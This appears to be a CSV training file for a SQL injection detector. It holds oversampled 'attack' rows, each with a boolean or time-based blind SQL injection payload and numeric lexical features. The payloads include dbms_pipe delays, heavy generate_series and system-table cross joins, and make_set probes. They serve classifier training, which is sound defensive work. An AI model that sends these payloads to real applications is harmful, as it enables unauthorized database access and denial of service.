id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000029,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000119,1.2890566413509583,127.02674922408315,33.02674922408315,3.805905642926065,37.0,15.0,50.0,25.026749224083147,0.29129528017788464,0.11809268115319647,0.3936422705106549,0.19696976815826395,0.5133746120415748,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,11.0,0.5133746120415748,2.0,1.0,9.0,0.5133746120415748,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000030,attack,boolean,"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",nearest_attack_euclidean,R000141,0.38238461688609543,152.59796552685484,29.75699753763249,3.8664950727675436,67.0,16.0,54.08397045158986,15.513995075264976,0.4397768287152729,0.10502133223051294,0.35360307671620134,0.10159876233801277,0.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,7.513995075264977,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000031,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.5431183064258925,144.4661477594865,30.71729182075892,4.205542781487823,80.5864591037946,8.85864591037946,37.86916728303568,17.15187546227676,0.5584801049815264,0.06140871593610095,0.2618906281734403,0.1182205509089323,3.5759377311383798,0.0,0.0,-1.3877787807814457e-17,1.0,1.85864591037946,0.0,4.0,0.0,0.0,2.85864591037946,2.85864591037946,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.8586459103794598,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.85864591037946
SMOTE_000032,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,1.1739776566088627,76.28038588029474,22.022691765587965,3.466075439731663,20.02269176558796,13.0,31.25769411470679,12.0,0.2637289101046579,0.17072989381984788,0.40794437101101927,0.15759682506447498,4.0,0.0,0.0,-1.3877787807814457e-17,0.32576941147067895,1.674230588529321,0.0,4.651538822941358,0.0,0.674230588529321,0.674230588529321,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs,nearest_attack_euclidean,R000102,0.0938839176435142,146.20264259184205,27.980066064796052,3.226631903854878,41.84052851836841,13.0,73.44184981428944,17.920264259184204,0.2863530232909142,0.08909438910967343,0.5019363195946491,0.12261626800476325,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.880396388776308,0.03986787040789763,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000034,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000064,1.3958280490949,125.16909215887937,34.753638238319056,3.9152368292893316,42.58454607943968,21.0,47.0,14.584546079439685,0.3402062111608799,0.1677834782810761,0.37551540377193227,0.11649490678611173,0.5845460794396844,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,7.0,0.0,1.0,1.0,5.0,0.5845460794396845,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5845460794396844,0.41545392056031555,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000035,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000027,0.5169693041126197,133.45711162863856,32.0,4.273613630327301,74.08577674272291,10.066593800156603,34.45711162863854,14.847629457120485,0.5552921790487758,0.07528433053754319,0.25814098027616184,0.11128251013751914,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.1523705428795146,0.0,4.0,0.0,0.0,2.8476294571204854,4.152370542879515,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.1523705428795147,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1523705428795146
SMOTE_000036,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'teng' like 'teng",nearest_attack_euclidean,R000039,0.5329947552104674,131.81329112766636,29.182570595743638,3.5785105526124665,48.904576425538174,10.0,54.81742940425636,18.091285297871817,0.37052907946198366,0.07593152184983311,0.41610194854288507,0.13743745014529807,5.0,0.0,0.0,1.0,0.0,0.0912852978718186,0.0,10.908714702128181,0.0912852978718186,0.0,1.0,1.0912852978718184,1.0,0.0,0.0,0.0,0.0,0.0912852978718185,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000108,0.2758626493829081,133.0816903178372,28.416338063567437,3.988919230402847,84.0,3.0,32.665352254269756,13.416338063567439,0.6314064892962323,0.022550231760579714,0.2452642986897387,0.1007789802534492,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.416338063567439,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000146,0.8660747994953301,140.82427075206564,35.83609151024089,3.964882578896082,51.65563395903644,18.838455661875937,51.16390848975911,19.16627264139416,0.36396355506573486,0.13611125638155222,0.36351468638201256,0.1364105021707004,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,8.0,0.0,0.8337273586058412,1.1662726413941589,4.667454717211682,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8337273586058411,0.0,0.8337273586058412,1.0,1.0,0.16627264139415876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.833727358605842
SMOTE_000039,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000093,0.5935329615049216,74.67508543656655,26.0,3.7917807490101296,15.435787517057047,24.0,24.478595839019018,10.760702080490493,0.2057125501084303,0.32188321053465796,0.3278656585223957,0.14453858083451607,0.0,0.7607020804904918,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,0.7607020804904919,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.7663584114963724,160.6986891100592,32.0,4.0408781133146565,73.6986891100592,18.0,48.0,21.0,0.4586097031279173,0.11201178555974124,0.29869809482597665,0.13068041648636478,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6986891100591996,0.3013108899408004,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000041,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000107,1.4964784054425992,71.39065566053182,22.26541037627727,3.2538315449411086,9.265410376277266,14.437377357872727,32.68786792638182,15.0,0.13011664099947268,0.20242631100165384,0.4573357324487908,0.2101213155500827,0.0,4.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,4.781311321063637,2.0,0.6093443394681816,0.6093443394681816,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000078,0.428065184560754,155.61593922023317,35.0,4.278493921794731,77.02832495833019,16.853096434524257,43.88142139285445,17.853096434524257,0.4949055750824529,0.10841817725984934,0.2818281585214309,0.11484808913626678,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.146903565475742,0.0,0.0,2.853096434524258,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.14690356547574202,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000043,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000044,0.6474327342992178,67.58805785558648,24.0,3.60441797280406,13.15283471335189,21.0,25.435223142234594,8.0,0.19413785897714442,0.3110622248715317,0.376300020962169,0.11849989518915492,0.0,0.0,2.0,-1.3877787807814457e-17,0.7176115711172969,2.0,0.0,3.0,0.0,0.0,0.282388428882703,4.717611571117297,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,boolean,"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",nearest_attack_euclidean,R000057,0.9485100732297765,143.3053187707445,34.90075982439207,4.254865595527486,64.67556986829405,15.675569868294055,43.05341920976432,19.900759824392072,0.4533958270572279,0.10939939351449315,0.29835925678737785,0.13884552264090105,4.0,4.0,0.22518995609801795,-1.3877787807814457e-17,0.0,1.774810043901982,0.0,4.900759824392072,0.0,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.774810043901982,0.22518995609801795,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000045,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000016,1.56063929385152,156.01837248263394,36.404899328702385,3.955636390895549,47.61347315393155,23.398775167824404,56.601224832175596,28.40489932870238,0.30420875459141455,0.15046523096023234,0.3634564202276943,0.18186959422065876,2.2024496643511906,0.0,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,11.0,0.0,2.0,1.0,11.20244966435119,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.6012248321755953,0.0,1.0,0.0,0.6012248321755953,0.3987751678244047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6012248321755953
SMOTE_000046,attack,boolean,"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R000040,0.45042858870861985,120.32893500444453,28.777411250370378,4.031601466718992,72.22258874962962,6.887056251851891,29.219290002963028,12.0,0.6014571959191707,0.05657924550957491,0.24205490992651219,0.09990864864474222,1.4451774992592439,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,3.5548225007407557,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000103,1.5512869898052257,134.19602761992593,31.20557910544557,4.220655674528784,76.57929030358923,8.551394776361391,34.308368658168355,14.75697388180696,0.5696283198288108,0.0642440160320825,0.2568094138006147,0.10931825033849202,2.6541843290841762,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,0.0,0.0,2.5513947763613922,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.5513947763613921,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5513947763613922
SMOTE_000048,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000121,1.2914966949689626,116.79481401342044,28.30129649664489,4.08558271006487,77.28833153019599,3.6025929932897824,22.698703503355112,13.205185986579565,0.6613468628820615,0.030978407015160067,0.19433290894195904,0.11334182116081946,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,2.0,0.0,1.506482483224456,2.6025929932897824,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000049,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000067,0.8640333902736381,126.65235393118225,32.652353931182255,3.7922669423916293,37.0,15.0,50.0,24.652353931182255,0.29215419795053676,0.11844089106102841,0.394802970203428,0.1946019407850068,0.32617696559112686,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,0.0,11.0,0.32617696559112674,2.0,1.0,9.0,0.32617696559112663,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000050,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000018,0.873014639712661,76.6318748737423,28.179124924245382,3.902364819928986,19.084624823239228,21.820875075754618,25.452749949496923,10.27362502525154,0.2480385254415299,0.28552140561297357,0.33208390399428517,0.13435616495121125,0.0,1.0,2.2736250252515386,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,4.273625025251539,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7263749747484612,0.27362502525153876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,boolean,"1'   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000015,0.12434607767799567,137.96942772516076,30.0,3.909845116839956,73.40028449189887,8.0,40.67685742494641,15.89228580831547,0.5316488440745211,0.058006428267108986,0.2950696395603474,0.11527508809802256,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.892285808315472,0.0,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000137,0.9768126116517867,117.08019913741839,28.459900431290805,4.062024939964272,73.10149353063792,5.299502156454027,26.67920345032644,12.0,0.6238720270033462,0.04544861609068672,0.2281780703519796,0.10250128655398738,2.08019913741839,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,2.91980086258161,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000053,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,0.007816057212331388,142.06953861349453,29.004967043821036,3.9878254257564705,67.0,16.0,45.05960452585245,14.009934087642074,0.471620662373414,0.11262582982051678,0.3171422266641294,0.09861128114193983,0.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.009934087642074,0.0,0.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000054,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000117,0.04244396913932489,65.31156646922558,23.097364521632997,3.640838672862392,13.136310330286197,20.077891617306395,24.0389458086532,8.058418712979798,0.20091354365976638,0.30747039425268835,0.36829133566971395,0.12332472641783138,0.0,1.0,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,2.019472904326599,0.0,0.019472904326598983,0.01947290432659865,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,boolean,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",nearest_attack_euclidean,R000023,0.15222511241802172,70.48560025528548,28.060700031910685,3.8351263567118608,17.42490022337479,16.0,26.0,11.060700031910685,0.24679263943157187,0.2271484241603356,0.36911618926054535,0.1569427471475472,0.0,4.0,1.0,-1.3877787807814457e-17,0.9392999680893155,1.0,0.0,4.0,0.0,0.060700031910684515,0.06070003191068429,2.9392999680893155,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000093,0.5909227361968281,74.66771878520373,26.0,3.7916996353436683,15.42947324446035,24.0,24.476491081486785,10.761754459256608,0.20565128148163583,0.3219134844443682,0.32786962296295297,0.14456561111104302,0.0,0.7617544592566082,3.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,0.7617544592566083,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.1901638301999589,75.19789458041664,18.93403513986112,2.893210082254694,13.934035139861116,9.197894580416644,40.0,12.06596486013888,0.18534736946388905,0.12223265680470059,0.5319802079971512,0.16043976573425922,4.0,0.0,0.06596486013888136,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,0.0,0.0,2.065964860138881,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9340351398611184,0.06596486013888136,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",nearest_attack_euclidean,R000007,1.866440022381921,103.33593977986612,28.449388686081136,3.8651220237404584,46.82982664067748,12.404890511350914,33.20244525567546,10.898777372162272,0.44127028222351594,0.12572115137910428,0.3273145640046814,0.10569400239269837,0.449388686081136,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,5.101222627837728,0.0,0.5506113139188641,1.4493886860811358,2.0,0.44938868608113597,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
